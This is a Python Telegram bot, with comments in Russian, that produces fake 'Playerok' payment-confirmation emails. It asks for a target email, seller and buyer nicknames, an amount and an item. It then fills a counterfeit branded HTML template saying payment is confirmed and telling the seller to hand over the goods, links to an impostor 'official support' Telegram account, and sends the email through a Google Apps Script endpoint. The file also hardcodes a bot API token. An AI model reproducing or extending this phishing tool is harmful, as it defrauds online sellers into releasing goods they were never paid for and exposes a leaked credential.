import asyncio, logging, aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8777068569:AAEl-874WqglkLNCl9Uyjc_VMApsNltS2Is'
GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwApBf3F8gJ34BGN5zvIlX_hPYkEz5K7aKDeoDH0pdE-I9TjCE-r2690IuTpl4OaJ9q/exec'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class OrderState(StatesGroup):
    waiting_email = State()
    waiting_seller = State()
    waiting_amount = State()
    waiting_item = State()
    waiting_buyer = State()

def get_html_template(seller, amount, item, buyer):
    s = seller.replace("@", "")
    b = buyer.replace("@", "")
    
    return f"""
<!DOCTYPE html>
<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="only">
    <style>
        :root {{ color-scheme: dark; supported-color-schemes: dark; }}
    </style>
</head>
<body style="margin:0; padding:0; background-color:#0a0a0a !important; color:#ffffff !important; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
    
    <div style="background-color:#0a0a0a !important; padding: 20px 10px; min-height: 100vh;">
        
        <div style="max-width:420px; margin:20px auto; text-align:left;">
            
            <div style="background: linear-gradient(135deg, #3291ff 0%, #00c2ff 100%) !important; padding: 30px 25px; border-radius: 25px 25px 12px 12px; margin-bottom: 12px;">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td>
                            <h2 style="margin:0; color:#ffffff !important; font-size:22px; font-weight:800;">Playerok • Сделка</h2>
                            <p style="margin:8px 0 0 0; color:#ffffff !important; font-size:12px; opacity:0.9;">Системное уведомление • Оплата подтверждена</p>
                        </td>
                        <td align="right" style="width:90px;">
                            <div style="background:#ffffff !important; color:#000000 !important; padding:8px 12px; border-radius:8px; font-weight:900; font-size:17px; text-align:center;">
                                Player<span style="color:#3586ff !important;">ok</span>
                            </div>
                        </td>
                    </tr>
                </table>
            </div>

            <div style="background-color:#141414 !important; border-radius:22px; padding:18px 22px; margin-bottom:12px; border:1px solid #262626;">
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                    <tr>
                        <td style="color:#ffffff !important; font-weight:700; font-size:17px;">👋 Здравствуйте, @{s}</td>
                        <td align="right"><span style="background-color:#2a2444 !important; color:#9a8cff !important; padding:6px 14px; border-radius:14px; font-size:11px; font-weight:700; text-transform:uppercase;">Seller</span></td>
                    </tr>
                </table>
            </div>

            <div style="background-color:#141414 !important; border-radius:22px; padding:22px; margin-bottom:12px; border:1px solid #262626;">
                <div style="color:#828282 !important; font-size:13px; margin-bottom:10px;">Статус</div>
                <div style="background-color:#00a651 !important; color:#ffffff !important; padding:9px 16px; border-radius:12px; font-size:13px; font-weight:800; display:inline-block; margin-bottom:18px;">✅ ОПЛАТА ПОДТВЕРЖДЕНА</div>
                
                <div style="color:#828282 !important; font-size:13px; margin-bottom:8px;">Сумма</div>
                <div style="color:#00a651 !important; font-size:32px; font-weight:800; margin:0 0 12px 0;">{amount} ₽</div>
                <p style="color:#828282 !important; font-size:14px; line-height:1.5; margin:0;">Оплата по сделке зафиксирована системой. Передайте товар покупателю.</p>
            </div>

            <div style="background-color:#141414 !important; border-radius:22px; padding:22px; margin-bottom:12px; border:1px solid #262626;">
                <div style="color:#828282 !important; font-size:13px; margin-bottom:20px; font-weight:600; text-transform:uppercase;">Детали сделки</div>
                <div style="margin-bottom:18px;">
                    <div style="color:#828282 !important; font-size:13px; margin-bottom:6px;">Товар</div>
                    <div style="color:#ffffff !important; font-weight:700; font-size:14px;">{item}</div>
                </div>
                <div style="margin-bottom:18px;">
                    <div style="color:#828282 !important; font-size:13px; margin-bottom:6px;">Покупатель</div>
                    <div style="color:#ffffff !important; font-weight:700; font-size:14px;">@{b}</div>
                </div>
                <div style="color:#00a651 !important; font-weight:800; font-size:14px;">Оплачено</div>
            </div>

            <div style="background-color:#1c1814 !important; border-left:4px solid #d29922 !important; padding:18px; border-radius:15px; margin-bottom:12px;">
                <div style="color:#e19d55 !important; font-size:12px; font-weight:800; text-transform:uppercase; margin-bottom:10px;">Действие сейчас</div>
                <div style="color:#ffffff !important; font-size:14px; margin-bottom:10px;">Передайте товар: <span style="background:#000000 !important; padding:3px 8px; border-radius:6px; border:1px solid #333333; font-weight:700;">@{b}</span></div>
                <div style="color:#828282 !important; font-size:13px;">Средства зачислятся автоматически после подтверждения.</div>
            </div>

            <div style="background-color:#141414 !important; border-radius:22px; padding:22px; border:1px solid #262626;">
                <a href="https://t.me/Helper_PlayerOK" style="display:block; background:#0a0a0a !important; border:1px solid #333333 !important; color:#ffffff !important; text-align:center; padding:16px; border-radius:14px; text-decoration:none; font-weight:700; font-size:14px;">Открыть поддержку в Telegram</a>
                <p style="text-align:center; color:#444444 !important; font-size:11px; margin-top:20px;">Официальный контакт: @Helper_PlayerOK<br>2026 Playerok</p>
            </div>
        </div>
    </div>
</body>
</html>
    """

# --- ЛОГИКА БОТА ---
async def send_via_google(email, body):
    async with aiohttp.ClientSession() as session:
        payload = {"email": email, "body": body}
        async with session.post(GOOGLE_SCRIPT_URL, json=payload, timeout=30) as resp:
            return await resp.text()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardBuilder().button(text="🚀 Создать уведомление", callback_data="start_order").as_markup()
    await message.answer("✅ Бот готов! Дизайн защищен от смены тем.", reply_markup=kb)

@dp.callback_query(F.data == "start_order")
async def start_order(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("1️⃣ Введите **Email** получателя:")
    await state.set_state(OrderState.waiting_email)
    await callback.answer()

@dp.message(OrderState.waiting_email)
async def step1(m: types.Message, state: FSMContext):
    if "@" not in m.text: return await m.answer("❌ Введите корректный Email!")
    await state.update_data(email=m.text)
    await m.answer(f"✅ Email: {m.text}\n2️⃣ Ник продавца:")
    await state.set_state(OrderState.waiting_seller)

@dp.message(OrderState.waiting_seller)
async def step2(m: types.Message, state: FSMContext):
    await state.update_data(seller=m.text)
    await m.answer(f"✅ Продавец: {m.text}\n3️⃣ Сумма сделки (₽):")
    await state.set_state(OrderState.waiting_amount)

@dp.message(OrderState.waiting_amount)
async def step3(m: types.Message, state: FSMContext):
    await state.update_data(amount=m.text)
    await m.answer(f"✅ Сумма: {m.text} ₽\n4️⃣ Название товара:")
    await state.set_state(OrderState.waiting_item)

@dp.message(OrderState.waiting_item)
async def step4(m: types.Message, state: FSMContext):
    await state.update_data(item=m.text)
    await m.answer("5️⃣ Ник покупателя:")
    await state.set_state(OrderState.waiting_buyer)

@dp.message(OrderState.waiting_buyer)
async def step5_final(m: types.Message, state: FSMContext):
    data = await state.get_data()
    buyer = m.text
    await m.answer("⏳ **Отправка...**")
    try:
        html_body = get_html_template(data['seller'], data['amount'], data['item'], buyer)
        result = await send_via_google(data['email'], html_body)
        if "Success" in result:
            await m.answer(f"✅ **Письмо отправлено!**")
        else:
            await m.answer(f"❌ Ошибка: {result}")
    except Exception as e:
        await m.answer(f"❌ Ошибка: {e}")
    await state.clear()

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
